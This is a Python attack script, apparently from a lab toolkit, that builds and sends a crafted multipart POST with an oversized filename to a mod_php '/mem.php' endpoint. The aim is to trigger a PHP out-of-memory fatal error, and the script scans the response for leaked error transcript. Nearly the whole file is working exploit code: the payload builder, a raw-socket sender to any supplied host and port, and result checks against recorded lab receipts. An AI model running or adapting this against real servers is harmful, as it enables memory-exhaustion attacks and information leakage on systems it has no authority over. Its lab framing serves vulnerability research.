#!/usr/bin/env python3
"""producer_modphp.py - modphp producer stage: machinery-encode OOM arm (int N = filename length).

Derived from the modphp_lab receipts (runs/run_20261021T155303Z_armoom,
READ-ONLY provenance; arm_modphp.py is a byte-exact mirror of the repo STOCK
module): body building delegates byte-for-byte to
tool/modules/native-output-leak-stock-arm.py:arm_body (PHPSESSID field first,
USP "MMM", 20 file parts F*9 + F*N, boundary NATIVEOUTPUTEXACT). The modphp
delta is TRANSPORT only: a Cookie: PHPSESSID=<sid> header is added
(session.use_only_cookies=1 on the receipt stack, so a form-field sid is
inert; the PHPSESSID field stays in the body for receipt byte parity).

N is the large filename length int. Receipt ladder (knob ON, memory_limit=2M):
  N=262144 -> body 4983500 B, OOM alloc 266240
  N=330000 -> body 6272764 B, OOM alloc 331776
  N=400000 -> body 7602764 B, OOM alloc 401408
i.e. alloc(N) = ((N // 4096) + 1) * 4096 (all three receipt points).

Knob requirement: the OOM fires ONLY with the server-side php memory_limit
set (httpd `php_value memory_limit 2M` in the receipt); with the knob absent
(C-phase receipt: 128M build default) the same byte-exact arm returns "0\n"
with NO OOM - a silent misfire. The knob value must be supplied (--memory-limit
or the TARGETS record); absence/128M-default is a pre-flight failure.

Byte-exact receipt parity (knob-off C1 == A1 bytes; embedded sha256 receipts):
  262144: 7c155121cd01eb7df0c9c2bf91172c012c17c986fbfbbb9053dc0121d9da31e3
Transport: the driver (--step producer) and the module CLI send the exact
request bytes to the supplied target; POST_MAX_SIZE ceiling guard like
producer_fpmwiki. The dry() byte builder remains available to the library and
records the same request bytes without a socket. Receipt success shape: HTTP
200 + 149-byte fatal transcript (mod_php keeps 200 when the OOM fires in the
machinery; the workers survive, prefork round-robin).
"""

import argparse
import hashlib
import importlib.util
import json
import re
import socket
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent


def _load_stock():
    spec = importlib.util.spec_from_file_location(
        "native_output_stock_arm", HERE / "native-output-leak-stock-arm.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


STOCK = _load_stock()

BOUNDARY = STOCK.BOUNDARY            # b"NATIVEOUTPUTEXACT" (receipt-verbatim)
PATH = "/mem.php"                    # receipt arm target (htdocs mem.php)
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 28850
DEFAULT_BODY_BYTES = 262144          # receipt ladder anchor
MAX_BODY_BYTES = 5_000_000           # filename-length sanity roof (> A4 ladder)
POST_MAX_SIZE = 8_388_608            # measured post_max_size (info.php receipt: 8M)
DEFAULT_SID = b"labprobe123"         # receipt byte-parity sid (inert form field)
SID_HEX_LEN = 32                     # live transport sid: 32 hex (Cookie header)
MEMORY_LIMIT_ABSENT = "128M"         # build default == knob OFF (C-phase receipt: NO OOM)
BM = (b"Allowed memory", b"exhausted", b"Fatal error", b"Unknown</b> on line")

RECEIPT = {
    "run": "modphp_lab/runs/run_20261021T155303Z_armoom (read-only provenance)",
    "memory_limit_knob": "2M (php_value, httpd_min.conf; knob OFF -> no OOM)",
    "outcome": "200 + 149-byte fatal transcript, worker survives (round-robin)",
}
RECEIPT_LADDER = {262144: 266240, 330000: 331776, 400000: 401408}
MEMORY_RECEIPT_NOTE = (
    "knob OFF (128M build default) -> same byte-exact arm returns '0\\n' with "
    "no OOM (C-phase receipt, C1 control)"
)
# receipt arm-body sha256 receipts (byte parity gate; sid = labprobe123):
#   A1/A2/C1 == 262144 (control C1 is byte-identical to A1)
RECEIPT_PARITY = {
    262144: "7c155121cd01eb7df0c9c2bf91172c012c17c986fbfbbb9053dc0121d9da31e3",
    330000: "fd8f2816dc8489b1812023229fc82323ba5c30373b4ddc5cbd043662ea8fbc57",
    400000: "a808a640677593c2faf2483695b36609f328031fc2251faa3604143afe971934",
}


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def alloc_bytes(n: int) -> int:
    """OOM alloc size from the filename-length ladder (all three receipt points):
    262144 -> 266240, 330000 -> 331776, 400000 -> 401408."""
    return ((n // 4096) + 1) * 4096


def validate_body_bytes(n: int) -> None:
    if not isinstance(n, int) or isinstance(n, bool):
        raise TypeError("body bytes must be an int")
    if not 1 <= n <= MAX_BODY_BYTES:
        raise ValueError(
            f"filename length must be an int between 1 and {MAX_BODY_BYTES} "
            f"(receipt ladder 262144/330000/400000; default {DEFAULT_BODY_BYTES})"
        )


def validate_memory_limit(memory_limit: str | None) -> str:
    """Pre-flight knob gate: refuse absent/default/bogus with a clear error."""
    knob = (memory_limit or "").strip()
    if not knob:
        raise ValueError(
            "modphp producer REQUIRES the server-side php memory_limit knob "
            "(httpd php_value memory_limit in the vhost; receipt: 2M). With the "
            "knob absent the byte-exact arm returns \"0\\n\" with NO OOM "
            "(C-phase receipt) - refusing a silent misfire"
        )
    if not re.fullmatch(r"\d+[KMG]?", knob):
        raise ValueError(
            "memory_limit must be an ini size like 2M / 1024K / N bytes "
            f"(got {knob!r})"
        )
    if knob.upper() == MEMORY_LIMIT_ABSENT:
        raise ValueError(
            f"memory_limit {MEMORY_LIMIT_ABSENT} is the build default = knob OFF "
            "(C-phase receipt: no machinery OOM); set the knob (e.g. 2M) first"
        )
    return knob


def validate_sid_hex(sid: str) -> str:
    """Live transport sid (Cookie header, use_only_cookies=1)."""
    if not re.fullmatch(r"[0-9a-f]{32}", sid or ""):
        raise ValueError(
            f"live --sid must be exactly {SID_HEX_LEN} hex chars (Cookie: "
            "PHPSESSID transport; the form-field sid is inert on this stack)"
        )
    return sid


def build(sid: bytes = DEFAULT_SID, text_bytes: int = DEFAULT_BODY_BYTES) -> dict:
    """Byte-exact receipt arm body via the STOCK module. Pure/offline."""
    validate_body_bytes(text_bytes)
    body = STOCK.arm_body(sid, text_bytes)
    over = len(body) >= POST_MAX_SIZE
    return {
        "body": body,
        "body_bytes": len(body),
        "over_budget": over,
        "expected_alloc_bytes": alloc_bytes(text_bytes),
        "boundary": BOUNDARY.decode("latin1"),
        "file_parts": STOCK.ARM_FILE_COUNT,
    }


def request_bytes(
    path: str,
    host_header: str,
    body: bytes,
    cookie_sid: str,
    keep_alive: bool = False,
) -> bytes:
    """Receipt transport: Cookie: PHPSESSID=<sid> header; no form-field sid."""
    headers = [
        f"POST {path} HTTP/1.1",
        f"Host: {host_header}",
        f"Cookie: PHPSESSID={cookie_sid}",
        "Content-Type: multipart/form-data; boundary=" + BOUNDARY.decode(),
        f"Content-Length: {len(body)}",
        "Connection: keep-alive" if keep_alive else "Connection: close",
    ]
    return ("\r\n".join(headers) + "\r\n\r\n").encode("ascii") + body


def scan_markers(data: bytes) -> list[dict]:
    hits = []
    for marker in BM:
        at = data.find(marker)
        if at >= 0:
            hits.append({
                "marker": marker.decode("latin1"),
                "offset": at,
                "context": data[max(0, at - 60):at + 120].decode("latin1", "replace"),
            })
    return hits


def parity(receipt: dict) -> str:
    """Byte-parity gate against the receipt arm bodies (sha256 receipts).

    For ladder N points with a recorded receipt sha and the receipt sid, a
    mismatch is a hard error (never a silent diverge). Returns the parity tag.
    """
    expected = RECEIPT_PARITY.get(receipt["text_bytes"])
    sid_bytes = receipt["sid_bytes"]
    if sid_bytes == DEFAULT_SID and expected is not None:
        actual = receipt["body_sha256"]
        if actual != expected:
            raise ValueError(
                "byte-parity failure vs the receipt arm body for N="
                f"{receipt['text_bytes']}: built sha256 {actual} != receipt "
                f"{expected}"
            )
        return "receipt-exact"
    return "sid-parameterized"


def dry(host_header: str, text_bytes: int, output: Path, memory_limit: str,
        sid: bytes = DEFAULT_SID) -> dict:
    """Offline stage: build + record the exact request bytes, zero sockets."""
    knob = validate_memory_limit(memory_limit)
    built = build(sid, text_bytes)
    body = built["body"]
    request = request_bytes(PATH, host_header, body, sid.decode("ascii"))
    record = {
        "text_bytes": text_bytes,
        "sid_bytes": sid,
        "body_sha256": _sha(body),
    }
    built["parity"] = parity(record)
    output.mkdir(parents=True, exist_ok=True)
    artifacts = {
        "modphp-arm-request.bin": request,
        "modphp-arm-body.bin": body,
    }
    artifacts_meta = {}
    for name, data in artifacts.items():
        (output / name).write_bytes(data)
        artifacts_meta[name[:-4].replace("-", "_")] = {
            "bytes": len(data),
            "sha256": _sha(data),
        }
    return {
        "stage": "producer",
        "producer_stage": "producer_modphp",
        "dry_run": True,
        "sent": False,
        "memory_limit_knob": knob,
        "knob_absence_consequence": MEMORY_RECEIPT_NOTE,
        "body_bytes": text_bytes,
        "edit_body_bytes": built["body_bytes"],
        "over_budget": built["over_budget"],
        "post_max_size": POST_MAX_SIZE,
        "expected_alloc_bytes": built["expected_alloc_bytes"],
        "boundary": built["boundary"],
        "file_parts": built["file_parts"],
        "cookie_transport": True,
        "use_only_cookies": 1,
        "form_field_sid": "inert (byte parity with the receipt body retained)",
        "receipt_ladder": RECEIPT_LADDER,
        "parity": built["parity"],
        "receipt": RECEIPT,
        "artifacts": artifacts_meta,
    }


def fire(host: str, port: int, text_bytes: int, output: Path, memory_limit: str,
         cookie_sid: str, timeout: float = 10.0, path: str = PATH) -> dict:
    """Send the arm to the supplied target: knob gate -> ceiling -> one exchange.

    Receipt success shape: HTTP 200 + fatal transcript body (worker survives).
    """
    knob = validate_memory_limit(memory_limit)
    sid = validate_sid_hex(cookie_sid)
    built = build(sid.encode("ascii"), text_bytes)   # byte-coherent: field == cookie sid
    body = built["body"]
    if len(body) >= POST_MAX_SIZE:   # hard pre-send ceiling guard
        raise ValueError(
            f"arm body {len(body)} bytes reaches the measured post_max_size "
            f"ceiling {POST_MAX_SIZE} (oversize aborts pre-machinery, no OOM)"
        )
    request = request_bytes(path, f"{host}:{port}", body, sid)
    started = time.monotonic()
    from tool.modules import arm  # local import keeps the dry path import-free
    with socket.create_connection((host, port), timeout=timeout) as connection:
        connection.settimeout(timeout)
        connection.sendall(request)
        response, decoded, headers, status = arm.read_response(
            connection.makefile("rb", buffering=0))
    wall_ms = round((time.monotonic() - started) * 1000, 1)

    output.mkdir(parents=True, exist_ok=True)
    artifacts = {
        "modphp-arm-request.bin": request,
        "modphp-arm-response.bin": response,
        "modphp-arm-body.bin": decoded,
    }
    artifacts_meta = {}
    for name, data in artifacts.items():
        (output / name).write_bytes(data)
        artifacts_meta[name[:-4].replace("-", "_")] = {
            "bytes": len(data),
            "sha256": _sha(data),
        }
    oom_receipt = b"Allowed memory" in decoded and b"exhausted" in decoded
    summary = {
        "stage": "producer",
        "producer_stage": "producer_modphp",
        "dry_run": False,
        "sent": True,
        "host": host,
        "port": port,
        "path": path,
        "memory_limit_knob": knob,
        "body_bytes": text_bytes,
        "edit_body_bytes": len(body),
        "post_max_size": POST_MAX_SIZE,
        "expected_alloc_bytes": built["expected_alloc_bytes"],
        "cookie_transport": True,
        "sid_hex": bool(re.fullmatch(r"[0-9a-f]{32}", sid)),
        "status": status,
        "response_body_bytes": len(decoded),
        "oom_receipt": oom_receipt,
        "note": "receipt shape: 200 + fatal transcript (mod_php keeps 200)",
        "markers": scan_markers(decoded),
        "wall_ms": wall_ms,
        "parity": "not-checked-on-live (sid-parameterized)",
        "receipt": RECEIPT,
        "artifacts": artifacts_meta,
    }
    return summary


def main() -> int:
    parser = argparse.ArgumentParser(
        description="modphp producer stage: send the receipt-ladder arm to the "
        "supplied target")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--path", default=PATH)
    parser.add_argument("--body-bytes", type=int, default=DEFAULT_BODY_BYTES,
                        help="large filename length N (int); receipt ladder "
                        "262144/330000/400000")
    parser.add_argument("--memory-limit", required=True,
                        help="server-side php memory_limit knob value "
                        "(receipt: 2M); refusing absent/128M (knob OFF)")
    parser.add_argument("--sid", default=None,
                        help="32 hex chars (Cookie PHPSESSID transport)")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--output", required=True, type=Path)
    args = parser.parse_args()
    if args.sid is None:
        parser.error("--sid is required (32 hex chars, Cookie transport)")

    summary = fire(args.host, args.port, args.body_bytes, args.output,
                   args.memory_limit, args.sid, timeout=args.timeout,
                   path=args.path)
    (args.output / "result.json").write_text(
        json.dumps(summary, indent=2, sort_keys=True) + "\n")
    print(json.dumps({k: v for k, v in summary.items() if k != "artifacts"},
                     indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
